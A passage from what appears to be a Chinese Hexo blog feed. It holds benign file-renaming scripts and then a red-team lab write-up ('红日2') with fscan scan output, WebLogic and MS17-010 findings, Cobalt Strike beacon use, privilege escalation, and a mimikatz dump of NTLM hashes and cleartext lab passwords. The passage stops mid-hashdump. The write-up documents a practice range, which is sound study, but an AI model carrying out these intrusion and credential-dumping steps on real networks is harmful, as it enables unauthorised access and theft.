class="type">in</span> <span class="type">os.listdir</span>(<span class="type">input_path</span>) <span class="type">if</span> <span class="type">f.endswith</span>(<span class="string">&#x27;.md&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not md_files:</span><br><span class="line">        print(<span class="string">&quot;没有找到 Markdown 文件。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> md_file <span class="keyword">in</span> md_files:</span><br><span class="line">        print(f<span class="string">&quot;正在处理文件：&#123;md_file&#125;&quot;</span>)</span><br><span class="line">        process_md_file(md_file, args.output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>go的去除_local的脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">// 获取当前目录</span><br><span class="line"><span class="built_in">dir</span>, err := os.Getwd()</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;获取当前目录失败: %v\n&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 遍历目录中的文件</span><br><span class="line">err = filepath.Walk(<span class="built_in">dir</span>, func(path string, info os.FileInfo, err error) error &#123;</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 跳过目录</span><br><span class="line"><span class="keyword">if</span> info.IsDir() &#123;</span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取文件名和扩展名</span><br><span class="line">filename := info.Name()</span><br><span class="line">ext := filepath.Ext(filename)</span><br><span class="line">base := strings.TrimSuffix(filename, ext)</span><br><span class="line"></span><br><span class="line">// 检查是否包含_local后缀</span><br><span class="line"><span class="keyword">if</span> strings.HasSuffix(base, <span class="string">&quot;_local&quot;</span>) &#123;</span><br><span class="line">// 构建新文件名</span><br><span class="line">newBase := strings.TrimSuffix(base, <span class="string">&quot;_local&quot;</span>)</span><br><span class="line">newFilename := newBase + ext</span><br><span class="line">newPath := filepath.Join(filepath.Dir(path), newFilename)</span><br><span class="line"></span><br><span class="line">// 重命名文件</span><br><span class="line">err := os.Rename(path, newPath)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;重命名失败: %s -&gt; %s (错误: %v)\n&quot;</span>, path, newPath, err)</span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;重命名成功: %s -&gt; %s\n&quot;</span>, path, newPath)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;遍历目录失败: %v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rename.exe是去除_local的</p><p>美化和主题配置</p><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">https://blog.csdn.net/mjh1667002013/article/details/129290903</a></p><p><a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>显示超时就多试几次吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日2</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>开局一个ip</p><p><font style="color:#000000;background-color:#FFFFFF;">10.10.0.102</font></p><p><font style="color:#000000;background-color:#FFFFFF;"></font></p><p>先扫一下端口吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\未免杀5号黯区红队开发的fscan图形化和plus&gt;fscan.exe -h 10.10.0.102</span><br><span class="line"></span><br><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: 1.8.4 TeamdArk5 v1.0</span><br><span class="line">start infoscan</span><br><span class="line">10.10.0.102:80 open</span><br><span class="line">10.10.0.102:135 open</span><br><span class="line">10.10.0.102:139 open</span><br><span class="line">10.10.0.102:445 open</span><br><span class="line">10.10.0.102:7001 open</span><br><span class="line">[*] alive ports len is: 5</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://10.10.0.102        code:200 len:0      title:None</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]10.10.0.102</span><br><span class="line">   [-&gt;]WEB</span><br><span class="line">   [-&gt;]10.10.0.102</span><br><span class="line">   [-&gt;]10.10.10.80</span><br><span class="line">[+] MS17-010 10.10.0.102        (Windows Server 2008 R2 Standard 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 10.10.0.102     WEB.de1ay.com                       Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br><span class="line">[*] WebTitle http://10.10.0.102:7001   code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan http://10.10.0.102:7001   [weblogic]</span><br><span class="line">已完成 5/5</span><br><span class="line">[*] 扫描结束,耗时: 21.7731798s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.0.102  10.10.10.80  WEB.de1ay.com   [weblogic]   Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br></pre></td></tr></table></figure><p>扫出来weblogic</p><p>那么我们直接梭吧</p><p><img src="/img/%E7%BA%A2%E6%97%A52/1.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A52/2.png"></p><p>注入内存马</p><p><img src="/img/%E7%BA%A2%E6%97%A52/3.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A52/4.png"></p><p>那么我们先上线cs吧（这里）</p><p><img src="/img/%E7%BA%A2%E6%97%A52/5.png"></p><p>不能直接土豆提权</p><p><img src="/img/%E7%BA%A2%E6%97%A52/6.png"></p><p>提权成功</p><p><img src="/img/%E7%BA%A2%E6%97%A52/7.png"></p><p>接下来就是横向移动了，这里内网信息收集一下</p><p>最好还是传fscan来</p><p><img src="/img/%E7%BA%A2%E6%97%A52/8.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A52/9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;fscan.exe -h 10.10.10.1/24 </span><br><span class="line"></span><br><span class="line">______                   _____  _           </span><br><span class="line"> |  ____|                 |  __ \| |          </span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ </span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/   </span><br><span class="line">                     fscan version: 1.8.4 TeamdArk5 v1.0</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 10.10.10.10     is alive</span><br><span class="line">(icmp) Target 10.10.10.80     is alive</span><br><span class="line">(icmp) Target 10.10.10.201    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">10.10.10.201:135 open</span><br><span class="line">10.10.10.80:135 open</span><br><span class="line">10.10.10.10:88 open</span><br><span class="line">10.10.10.80:7001 open</span><br><span class="line">10.10.10.201:445 open</span><br><span class="line">10.10.10.80:445 open</span><br><span class="line">10.10.10.10:445 open</span><br><span class="line">10.10.10.201:139 open</span><br><span class="line">10.10.10.80:139 open</span><br><span class="line">10.10.10.10:139 open</span><br><span class="line">10.10.10.10:135 open</span><br><span class="line">10.10.10.80:80 open</span><br><span class="line">[*] alive ports len is: 12</span><br><span class="line">start vulscan</span><br><span class="line">[+] MS17-010 10.10.10.80(Windows Server 2008 R2 Standard 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]10.10.10.80</span><br><span class="line">   [-&gt;]WEB</span><br><span class="line">   [-&gt;]10.10.0.102</span><br><span class="line">   [-&gt;]10.10.10.80</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]10.10.10.10</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]10.10.10.10</span><br><span class="line">[*] NetBios 10.10.10.80     WEB.de1ay.com                       Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br><span class="line">[+] MS17-010 10.10.10.201(Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[+] MS17-010 10.10.10.10(Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]10.10.10.201</span><br><span class="line">   [-&gt;]PC</span><br><span class="line">   [-&gt;]10.10.10.201</span><br><span class="line">   [-&gt;]10.10.0.103</span><br><span class="line">[*] WebTitle http://10.10.10.80        code:200 len:0      title:None</span><br><span class="line">[*] NetBios 10.10.10.201    PC                   Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[*] NetBios 10.10.10.10     [+] DC:DC.de1ay.com                  Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] WebTitle http://10.10.10.80:7001   code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan http://10.10.10.80:7001   [weblogic] </span><br><span class="line">[+] PocScan http://10.10.10.80:7001 poc-yaml-weblogic-cve-2019-2729-2 </span><br><span class="line">[+] PocScan http://10.10.10.80:7001 poc-yaml-weblogic-cve-2019-2729-1 </span><br><span class="line">[+] PocScan http://10.10.10.80:7001 poc-yaml-weblogic-cve-2019-2725 v10</span><br><span class="line">已完成 12/12</span><br><span class="line">[*] 扫描结束,耗时: 19.6126714s</span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.0.102  10.10.10.80 (已拿下)  WEB.de1ay.com   [weblogic]   Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br><span class="line">10.10.0.103  10.10.10.201  PC</span><br><span class="line">10.10.10.10  DC.de1ay.com  DC.de1ay.com</span><br></pre></td></tr></table></figure><p>接下来就是构建隧道了</p><p>cs直接开启</p><p><img src="/img/%E7%BA%A2%E6%97%A52/10.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A52/11.png"></p><p>然后抓取一下hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">[05/25 21:36:08] beacon&gt; logonpasswords</span><br><span class="line">[05/25 21:36:08] [*] Tasked beacon to run mimikatz&#x27;s sekurlsa::logonpasswords command</span><br><span class="line">[05/25 21:36:08] [+] host called home, sent: 297594 bytes</span><br><span class="line">[05/25 21:36:09] [+] received output:</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 16413138 (00000000:00fa71d2)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/5/25 21:06:35</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * NTLM     : 73805069e2c7227f110772875f1b0e41</span><br><span class="line"> * SHA1     : b4c99cab2eebaf54cbd0076ec4869f3ecf579295</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : de1ay.com</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 590028 (00000000:000900cc)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : de1ay</span><br><span class="line">Domain            : WEB</span><br><span class="line">Logon Server      : WEB</span><br><span class="line">Logon Time        : 2024/4/9 7:15:22</span><br><span class="line">SID               : S-1-5-21-3767205380-3469466069-2137393323-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * LM       : bbaeaaf651609b9337bf477e3ed39fca</span><br><span class="line"> * NTLM     : 295b75bdc039b5c4e06f05b277b9e9de</span><br><span class="line"> * SHA1     : 778c92793f80662abb7d8f7dad6547e9c1869c71</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * Password : C3ting@2024</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * Password : C3ting@2024</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * Password : C3ting@2024</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 589984 (00000000:000900a0)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : de1ay</span><br><span class="line">Domain            : WEB</span><br><span class="line">Logon Server      : WEB</span><br><span class="line">Logon Time        : 2024/4/9 7:15:22</span><br><span class="line">SID               : S-1-5-21-3767205380-3469466069-2137393323-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * LM       : bbaeaaf651609b9337bf477e3ed39fca</span><br><span class="line"> * NTLM     : 295b75bdc039b5c4e06f05b277b9e9de</span><br><span class="line"> * SHA1     : 778c92793f80662abb7d8f7dad6547e9c1869c71</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * Password : C3ting@2024</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * Password : C3ting@2024</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : de1ay</span><br><span class="line"> * Domain   : WEB</span><br><span class="line"> * Password : C3ting@2024</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WEB$</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/4/9 7:13:13</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * NTLM     : 73805069e2c7227f110772875f1b0e41</span><br><span class="line"> * SHA1     : b4c99cab2eebaf54cbd0076ec4869f3ecf579295</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : web$</span><br><span class="line"> * Domain   : de1ay.com</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53214 (00000000:0000cfde)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/4/9 7:13:00</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * NTLM     : 73805069e2c7227f110772875f1b0e41</span><br><span class="line"> * SHA1     : b4c99cab2eebaf54cbd0076ec4869f3ecf579295</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/4/9 7:13:34</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/4/9 7:13:13</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WEB$</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/4/9 7:13:00</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WEB$</span><br><span class="line"> * Domain   : DE1AY</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : web$</span><br><span class="line"> * Domain   : DE1AY.COM</span><br><span class="line"> * Password : `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[05/25 21:35:36] beacon&gt; hashdump</span><br><span class="line">[05/25 21:35:36] [*] Tasked beacon to dump hashes</span><br><span class="line">[05/25 21:35:38] [+] host called home, sent: 82541 bytes</span><br><span class="line">[05/25 21:35:39] [+] received password hashes:</span><br><span 